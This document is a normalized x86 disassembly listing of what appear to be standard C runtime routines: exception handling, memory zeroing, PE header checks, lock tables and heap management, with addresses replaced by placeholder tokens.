xor esi [ rw-data ]
push edi
mov eax [ esi ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
lea edi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_1000ac69
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_1000ac69
mov edx 0xfffffffe
cmp [ ebx + 0xc ] edx
je r-xdata
mov ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x18 ]
mov [ ebx - 0x4 ] edx
mov ebx [ ebx + 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
cmp ebx 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push edi
mov ecx ebx
call sub_10019bb4
jmp r-xdata
lea ecx [ ecx ]
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov ebx eax
cmp eax 0xfffffffe
jne r-xdata
mov edx edi
call sub_10019b6a
mov [ ebp - 0x1 ] 0x1
test eax eax
jl r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_1000ac69
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_1000ac69
lea eax [ ebx + ebx * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
lea eax [ esi + eax * 4 + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
call sub_10019b9a
mov eax [ ebp + 0xc ]
cmp [ eax + 0xc ] ebx
je r-xdata
cmp [ r--data ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push edi
mov edx ebx
mov ecx eax
call sub_10019bb4
mov eax [ ebp + 0xc ]
push r--data
call sub_100125a0
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_1000ac69
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8 ]
mov edx edi
call sub_10019b81
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_1000ac69
mov edx [ ebp + 0x8 ]
push 0x1
push edx
call [ r--data ]
add esp 0x8
sub_100120bc
push ebp
mov ebp esp
sub esp 0x4
mov [ ebp - 0x4 ] edi
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
shr ecx 0x7
pxor xmm0 xmm0
jmp r-xdata
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm0
movdqa [ edi + 0x20 ] xmm0
movdqa [ edi + 0x30 ] xmm0
movdqa [ edi + 0x40 ] xmm0
movdqa [ edi + 0x50 ] xmm0
movdqa [ edi + 0x60 ] xmm0
movdqa [ edi + 0x70 ] xmm0
lea edi [ edi + 0x80 ]
dec ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_10012113
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0x8 ]
cdq
mov edi eax
xor edi edx
sub edi edx
and edi 0xf
xor edi edx
sub edi edx
test edi edi
jne r-xdata
neg edi
add edi 0x10
mov [ ebp - 0x10 ] edi
xor eax eax
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
[ edi ]
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
add ecx eax
sub edx eax
push edx
push 0x0
push ecx
call sub_10012113
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
and edx 0x7f
mov [ ebp - 0xc ] edx
cmp ecx edx
je r-xdata
test edx edx
je r-xdata
sub ecx edx
push ecx
push eax
call sub_100120bc
add esp 0x8
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
add eax [ ebp + 0x10 ]
sub eax edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov edi [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
[ edi ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_100121a2
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi ecx
mov [ edi ] r--data
mov eax [ ebx ]
test eax eax
je r-xdata
and [ edi + 0x4 ] 0x0
push eax
call sub_1000b9b0
mov esi eax
inc esi
push esi
call sub_1000c036
pop ecx
pop ecx
mov [ edi + 0x4 ] eax
test eax eax
je r-xdata
mov [ edi + 0x8 ] 0x1
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
push [ ebx ]
push esi
push eax
call sub_1001479b
add esp 0xc
jmp r-xdata
sub_10012212
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi ] r--data
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
test eax eax
mov eax [ ebx + 0x4 ]
push edi
je r-xdata
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
and [ esi + 0x4 ] 0x0
jmp r-xdata
push eax
call sub_1000b9b0
mov edi eax
inc edi
push edi
call sub_1000c036
pop ecx
pop ecx
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
push [ ebx + 0x4 ]
push edi
push eax
call sub_1001479b
add esp 0xc
jmp r-xdata
sub_10012292
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1001226f
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000b6da
pop ecx
sub_100122c2
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call sub_1000e0ba
pop ecx
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_100122ea
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
pop edi
mov [ ebp - 0x4 ] eax
pop esi
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
leave
retn 0x8
test [ eax ] 0x8
je r-xdata
mov [ ebp - 0xc ] 0x1994000
sub_10012336
push 0xc
push r--data
call sub_10011ecc
push 0xe
call sub_100129fe
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001239d
call sub_10011f11
retn
mov eax [ rw-data ]
mov edx rw-data
push [ esi + 0x4 ]
call sub_1000bf59
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ eax ] ecx
jne r-xdata
mov edx eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
push eax
call sub_1000bf59
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
sub_100123b0
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_10012438
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
cmp [ ebp + 0x14 ] edi
jne r-xdata
cmp esi edi
je r-xdata
cmp esi edi
jne r-xdata
call sub_1000e8db
push 0x16
pop esi
mov [ eax ] esi
mov ebx [ ebp + 0xc ]
cmp ebx edi
ja r-xdata
cmp [ ebp + 0xc ] edi
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x14 ] edi
jne r-xdata
xor eax eax
mov edx [ ebp + 0x10 ]
cmp edx edi
jne r-xdata
xor eax eax
mov [ esi ] ax
jmp r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
mov eax esi
jne r-xdata
xor eax eax
mov [ esi ] ax
jmp r-xdata
movzx ecx [ edx ]
mov [ eax ] cx
inc eax
inc eax
inc edx
inc edx
cmp cx di
je r-xdata
movzx ecx [ edx ]
mov [ eax ] cx
inc eax
inc eax
inc edx
inc edx
cmp cx di
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
dec ebx
je r-xdata
cmp ebx edi
jne r-xdata
dec ebx
jne r-xdata
xor ecx ecx
mov [ eax ] cx
dec [ ebp + 0x14 ]
jne r-xdata
xor eax eax
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
jmp r-xdata
mov [ esi ] ax
call sub_1000e8db
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov ecx [ ebp + 0xc ]
push 0x50
mov [ esi + ecx * 2 - 0x2 ] ax
pop eax
jmp r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_1000e873
add esp 0x14
mov eax esi
jmp r-xdata
sub_10012510
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_10012550
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
jbe r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_100125a0
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_10011f30
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_10012510
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_10012550
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1001265e
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
call sub_1000e2ca
mov esi eax
test esi esi
je r-xdata
pop esi
leave
retn
mov edx [ esi + 0x5c ]
mov eax [ rw-data ]
push edi
mov edi [ ebp + 0x8 ]
mov ecx edx
push ebx
imul eax eax 0xc
add eax edx
cmp ecx eax
jae r-xdata
mov ebx eax
imul ebx ebx 0xc
add ecx 0xc
add ebx edx
cmp ecx ebx
jb r-xdata
xor eax eax
cmp [ ecx ] edi
jne r-xdata
cmp [ ecx ] edi
je r-xdata
xor eax eax
jmp r-xdata
mov ebx [ eax + 0x8 ]
mov [ ebp - 0x4 ] ebx
test ebx ebx
jne r-xdata
mov eax ecx
jmp r-xdata
pop ebx
pop edi
cmp ebx 0x5
jne r-xdata
test eax eax
je r-xdata
cmp ebx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
mov ecx [ esi + 0x60 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp + 0xc ]
mov [ esi + 0x60 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
and [ eax + 0x8 ] 0x0
push ecx
call ebx
mov ecx [ rw-data ]
mov edi [ rw-data ]
mov edx ecx
add edi ecx
cmp edx edi
jge r-xdata
mov eax [ eax ]
mov edi [ esi + 0x64 ]
cmp eax 0xc000008e
jne r-xdata
imul ecx ecx 0xc
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
mov edi [ esi + 0x5c ]
and [ ecx + edi + 0x8 ] 0x0
mov edi [ rw-data ]
mov ebx [ rw-data ]
inc edx
add ebx edi
add ecx 0xc
cmp edx ebx
jl r-xdata
mov ebx [ ebp - 0x4 ]
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call ebx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
mov [ esi + 0x60 ] eax
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
mov [ esi + 0x64 ] 0x8a
sub_100127be
mov edi edi
push ebp
mov ebp esp
mov eax 0xe06d7363
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0xc ]
push eax
call sub_1001265e
pop ecx
pop ecx
pop ebp
retn
sub_100127de
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] eax
push 0x0
sete al
push 0x1000
push eax
call [ HeapCreate@IAT ]
mov [ rw-data ] eax
test eax eax
jne r-xdata
xor eax eax
inc eax
mov [ rw-data ] eax
pop ebp
retn
pop ebp
retn
sub_1001280e
cmp [ rw-data ] 0x3
jne r-xdata
push [ rw-data ]
call [ HeapDestroy@IAT ]
and [ rw-data ] 0x0
retn
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push edi
mov edi [ HeapFree@IAT ]
jle r-xdata
push [ rw-data ]
push 0x0
push [ rw-data ]
call edi
pop edi
pop ebx
push esi
mov esi [ rw-data ]
add esi 0x10
push 0x8000
push 0x0
push [ esi - 0x4 ]
call [ VirtualFree@IAT ]
push [ esi ]
push 0x0
push [ rw-data ]
call edi
add esi 0x14
inc ebx
cmp ebx [ rw-data ]
jl r-xdata
pop esi
sub_10012882
mov edi edi
push esi
push edi
xor esi esi
mov edi rw-data
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rw-data ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call sub_10019a15
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ esi * 8 + rw-data ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rw-data ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_100128cd
mov edi edi
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rw-data
push edi
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rw-data
pop edi
push edi
call ebx
push edi
call sub_1000bf59
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_1001293b
push 0xc
push r--data
call sub_10011ecc
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rw-data ]
cmp [ esi ] ebx
je r-xdata
call sub_100136a0
push 0x1e
call sub_100134f5
push 0xff
call sub_10011c3d
push 0x18
call sub_100119e5
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_100129fe
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_1000e8db
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_10011f11
retn
push edi
call sub_1000bf59
pop ecx
push 0xfa0
push edi
call sub_10019a15
pop ecx
pop ecx
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_1000bf59
pop ecx
call sub_1000e8db
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100129f5
mov eax [ ebp - 0x1c ]
sub_100129fe
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_1001293b
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_10011be9
pop ecx
sub_10012a31
mov edi edi
push ebp
mov ebp esp
mov ecx [ rw-data ]
mov eax [ rw-data ]
imul ecx ecx 0x14
add ecx eax
jmp r-xdata
cmp eax ecx
jb r-xdata
mov edx [ ebp + 0x8 ]
sub edx [ eax + 0xc ]
cmp edx 0x100000
jb r-xdata
xor eax eax
pop ebp
retn
add eax 0x14
sub_10012a61
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi esi
sub edi [ ecx + 0xc ]
add esi 0xfffffffc
shr edi 0xf
mov ecx edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ esi ]
dec ecx
mov [ ebp - 0x4 ] ecx
test cl 0x1
jne r-xdata
pop edi
pop esi
leave
retn
push ebx
lea ebx [ ecx + esi ]
mov edx [ ebx ]
mov [ ebp - 0xc ] edx
mov edx [ esi - 0x4 ]
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0xc ]
mov [ ebp + 0xc ] ebx
test dl 0x1
jne r-xdata
mov edx ecx
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
mov ebx [ ebp - 0x8 ]
and ebx 0x1
mov [ ebp - 0xc ] ebx
jne r-xdata
push 0x3f
pop edx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
push 0x3f
pop edx
mov ebx [ ebp + 0x8 ]
sub esi [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
sar ebx 0x4
push 0x3f
mov [ ebp + 0xc ] esi
dec ebx
pop esi
cmp ebx esi
jbe r-xdata
mov edx [ ebx + 0x8 ]
mov ebx [ ebx + 0x4 ]
mov ecx [ ebp - 0x4 ]
add ecx [ ebp - 0xc ]
mov [ edx + 0x4 ] ebx
mov edx [ ebp + 0xc ]
mov ebx [ edx + 0x4 ]
mov edx [ edx + 0x8 ]
mov [ ebx + 0x8 ] edx
mov [ ebp - 0x4 ] ecx
mov ebx 0x80000000
cmp edx 0x20
jae r-xdata
mov ecx [ ebp - 0x10 ]
lea ecx [ ecx + edx * 8 ]
mov ebx [ ecx + 0x4 ]
mov [ esi + 0x8 ] ecx
mov [ esi + 0x4 ] ebx
mov [ ecx + 0x4 ] esi
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov ecx [ esi + 0x4 ]
cmp ecx [ esi + 0x8 ]
jne r-xdata
cmp ebx edx
je r-xdata
add ecx [ ebp - 0x8 ]
mov edx ecx
sar edx 0x4
dec edx
mov [ ebp - 0x4 ] ecx
cmp edx esi
jbe r-xdata
mov ebx esi
lea ecx [ edx - 0x20 ]
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx edx
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov [ eax + esi - 0x4 ] eax
mov eax [ ebp - 0x10 ]
dec [ eax ]
jne r-xdata
mov cl [ edx + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
mov [ edx + eax + 0x4 ] cl
cmp edx 0x20
jae r-xdata
cmp ebx edx
je r-xdata
mov edx esi
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
pop ebx
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov esi [ ebp + 0xc ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] edi
mov ecx [ rw-data ]
mov esi [ VirtualFree@IAT ]
push 0x4000
shl ecx 0xf
add ecx [ eax + 0xc ]
mov ebx 0x8000
push ebx
push ecx
call esi
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx 0x80000000
shr edx cl
or [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
mov ecx [ rw-data ]
and [ eax + ecx * 4 + 0xc4 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
dec [ eax + 0x43 ]
mov eax [ rw-data ]
mov ecx [ eax + 0x10 ]
cmp [ ecx + 0x43 ] 0x0
jne r-xdata
lea ecx [ edx - 0x20 ]
mov edx 0x80000000
shr edx cl
lea eax [ eax + edi * 4 + 0xc4 ]
or [ eax ] edx
lea ecx [ edx - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
mov ebx 0x80000000
mov ecx edx
shr ebx cl
lea eax [ eax + edi * 4 + 0x44 ]
or [ eax ] ebx
jmp r-xdata
mov ecx edx
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov [ esi + 0x8 ] ecx
mov esi 0x80000000
cmp ebx 0x20
jae r-xdata
cmp [ eax + 0x8 ] 0xffffffff
jne r-xdata
and [ eax + 0x4 ] 0xfffffffe
mov eax [ rw-data ]
lea ecx [ ebx - 0x20 ]
shr esi cl
not esi
and [ eax + edi * 4 + 0xc4 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
mov ecx ebx
shr esi cl
not esi
and [ eax + edi * 4 + 0x44 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
push ebx
push 0x0
push [ eax + 0xc ]
call esi
mov eax [ rw-data ]
push [ eax + 0x10 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
mov ecx [ rw-data ]
mov eax [ rw-data ]
imul ecx ecx 0x14
mov edx [ rw-data ]
sub ecx eax
lea ecx [ ecx + edx - 0x14 ]
push ecx
lea ecx [ eax + 0x14 ]
push ecx
push eax
call sub_10019bd0
mov eax [ ebp + 0x8 ]
add esp 0xc
dec [ rw-data ]
cmp eax [ rw-data ]
jbe r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
and [ ecx ] esi
jmp r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
sub [ ebp + 0x8 ] 0x14
sub_10012d77
mov eax [ rw-data ]
push esi
mov esi [ rw-data ]
push edi
xor edi edi
cmp esi eax
jne r-xdata
imul esi esi 0x14
add esi [ rw-data ]
push 0x41c4
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ esi + 0x10 ] eax
cmp eax edi
je r-xdata
add eax 0x10
imul eax eax 0x14
push eax
push [ rw-data ]
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
cmp eax edi
jne r-xdata
xor eax eax
jmp r-xdata
push 0x4
push 0x2000
push 0x100000
push edi
call [ VirtualAlloc@IAT ]
mov [ esi + 0xc ] eax
cmp eax edi
jne r-xdata
add [ rw-data ] 0x10
mov esi [ rw-data ]
mov [ rw-data ] eax
pop edi
pop esi
retn
or [ esi + 0x8 ] 0xffffffff
mov [ esi ] edi
mov [ esi + 0x4 ] edi
inc [ rw-data ]
mov eax [ esi + 0x10 ]
or [ eax ] 0xffffffff
mov eax esi
push [ esi + 0x10 ]
push edi
push [ rw-data ]
call [ HeapFree@IAT ]
jmp r-xdata
sub_10012e27
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x8 ]
push ebx
push esi
mov esi [ ecx + 0x10 ]
push edi
xor ebx ebx
jmp r-xdata
test eax eax
jge r-xdata
add eax eax
inc ebx
mov eax ebx
imul eax eax 0x204
lea eax [ eax + esi + 0x144 ]
push 0x3f
mov [ ebp - 0x8 ] eax
pop edx
mov [ eax + 0x8 ] eax
mov [ eax + 0x4 ] eax
add eax 0x8
dec edx
jne r-xdata
push 0x4
mov edi ebx
push 0x1000
shl edi 0xf
add edi [ ecx + 0xc ]
push 0x8000
push edi
call [ VirtualAlloc@IAT ]
test eax eax
jne r-xdata
lea edx [ edi + 0x7000 ]
mov [ ebp - 0x4 ] edx
cmp edi edx
ja r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1f8
lea ecx [ edi + 0xc ]
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x8 ] eax
lea ecx [ edx + 0xc ]
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
and [ esi + ebx * 4 + 0x44 ] 0x0
xor edi edi
inc edi
mov [ esi + ebx * 4 + 0xc4 ] edi
mov al [ esi + 0x43 ]
mov cl al
inc cl
test al al
mov eax [ ebp + 0x8 ]
mov [ esi + 0x43 ] cl
jne r-xdata
mov ecx edx
sub ecx edi
shr ecx 0xc
lea eax [ edi + 0x10 ]
inc ecx
pop edi
pop esi
pop ebx
leave
retn
mov edx 0x80000000
mov ecx ebx
shr edx cl
not edx
and [ eax + 0x8 ] edx
mov eax ebx
or [ eax + 0x4 ] edi
or [ eax - 0x8 ] 0xffffffff
or [ eax + 0xfec ] 0xffffffff
lea edx [ eax + 0xffc ]
mov [ eax ] edx
lea edx [ eax - 0x1004 ]
mov [ eax - 0x4 ] 0xff0
mov [ eax + 0x4 ] edx
mov [ eax + 0xfe8 ] 0xff0
add eax 0x1000
dec ecx
jne r-xdata
mov edx [ ebp - 0x4 ]
sub_10012f2f
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
mov edx edi
sub edx [ ecx + 0xc ]
add esi 0x17
shr edx 0xf
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
